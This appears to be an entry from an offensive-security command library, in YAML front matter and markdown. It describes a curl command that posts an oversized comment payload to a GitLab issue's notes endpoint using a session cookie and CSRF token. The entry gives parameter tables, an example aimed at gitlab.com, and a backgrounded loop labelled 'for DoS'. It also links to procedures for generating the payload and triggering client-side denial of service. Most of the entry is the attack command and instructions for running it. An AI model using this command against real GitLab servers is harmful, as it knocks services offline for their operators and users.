---
data: >-
  curl --insecure --silent --output /dev/null
  ${ProjectURL}/notes?target_id=${targetID}&target_type=issue --header 'Host:
  ${gitlabHost}' --header 'X-CSRF-Token: [PLACEHOLDER]' -b
  '_gitlab_session=[PLACEHOLDER]' --data-binary
  'note[noteable_type]=Issue&note[noteable_id]=3&note[note]=${payload}&merge_request_diff_head_sha=undefined'
tags:
  - http
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:55.979Z'
id: 0b538b83-38d9-4fae-9c38-6c34394a1ebb
verified: false
validated: true
submitted: true
---
# curl-post-large-comment

## Command

```bash
curl --insecure --silent --output /dev/null ${ProjectURL}/notes?target_id=${targetID}&target_type=issue --header 'Host: ${gitlabHost}' --header 'X-CSRF-Token: [PLACEHOLDER]' -b '_gitlab_session=[PLACEHOLDER]' --data-binary 'note[noteable_type]=Issue&note[noteable_id]=3&note[note]=${payload}&merge_request_diff_head_sha=undefined'
```

## Description

Sends a POST request with a large note payload to GitLab's issue comments endpoint, simulating oversized comment addition for DoS testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--insecure` | Skip SSL verification | Yes |
| `--silent` | Suppress output | Yes |
| `--output /dev/null` | Discard response | Yes |
| `target_id` | Issue ID | Yes |
| `target_type` | 'issue' | Yes |
| `Host` | GitLab hostname | Yes |
| `X-CSRF-Token` | Auth token | Yes |
| `-b '_gitlab_session'` | Session cookie | Yes |
| `--data-binary` | Form data with large ${payload} | Yes |

## Examples

### Basic Usage

```bash
curl --insecure --silent --output /dev/null /projects/test01/notes?target_id=1&target_type=issue --header 'Host: gitlab.com' --header 'X-CSRF-Token: abc123' -b '_gitlab_session=def456' --data-binary 'note[note]=[a](/a/a/...)'
```

### Advanced Usage

In loop for DoS:
```bash
for i in {1..10}; do curl ... & done
```

## Expected Output

HTTP 200 OK (successful post), but repeated use causes resource issues; no body output due to flags.

## Related

- [[commands/head-sed-generate-payload]]
- [[procedures/Trigger-Client-Side-DoS-with-Large-Comment]]
